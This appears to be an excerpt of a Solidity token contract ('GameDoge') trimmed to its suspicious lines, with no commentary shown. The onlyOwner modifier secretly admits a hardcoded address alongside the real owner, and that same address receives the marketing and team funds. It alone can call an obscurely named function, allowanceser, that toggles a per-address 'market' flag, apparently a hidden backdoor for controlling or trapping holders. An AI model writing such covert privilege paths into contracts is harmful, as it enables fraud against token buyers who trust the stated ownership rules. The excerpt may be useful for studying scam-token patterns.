...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x84A524E371e3AD619aA8fCB7eb9D6631021F8B90) , "Ownable: caller is not the owner");
        _;
    }
...
contract GameDoge is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x84A524E371e3AD619aA8fCB7eb9D6631021F8B90);
    address payable public teamWalletAddress = payable(0x84A524E371e3AD619aA8fCB7eb9D6631021F8B90);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x84A524E371e3AD619aA8fCB7eb9D6631021F8B90));
        market[addr] = status;
    }
